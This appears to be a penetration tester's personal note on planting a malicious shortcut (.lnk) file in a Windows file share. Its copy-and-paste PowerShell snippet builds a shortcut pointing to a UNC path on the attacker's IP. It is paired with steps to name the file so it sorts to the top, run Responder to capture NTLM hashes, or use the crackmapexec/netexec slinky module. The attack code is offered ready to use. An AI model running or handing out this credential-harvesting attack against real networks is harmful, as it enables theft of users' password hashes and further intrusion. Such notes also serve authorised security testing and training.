  
Placing a malicious file in a shared folder
![Untitled 25.png](/Untitled%2025.png)
- ip in the script is the attacker machine’s ip
- can do this from ANY windows device
    
    - does not have to be the target machine
    
![Untitled 1 12.png](/Untitled%201%2012.png)
- can name the file starting with a ~ or an @ symbol
    
    - the goal is to have the file show near the top of the folder
    
- next put the file into the fileshare
![Untitled 2 12.png](/Untitled%202%2012.png)
![Untitled 3 10.png](/Untitled%203%2010.png)
  
next run responder
![Untitled 4 6.png](/Untitled%204%206.png)
- once responder is up, navigate to the fileshare folder and check for hashes
![Untitled 5 6.png](/Untitled%205%206.png)
  
  
  
  
crackmapexec (or netexec) has a built in module called slinky that will upload the file for you
![Untitled 6 4.png](/Untitled%206%204.png)
  
Code to copy and paste for the lnk attack
```Bash
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\test.lnk")
$lnk.TargetPath = "\\192.168.138.149\@test.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()
```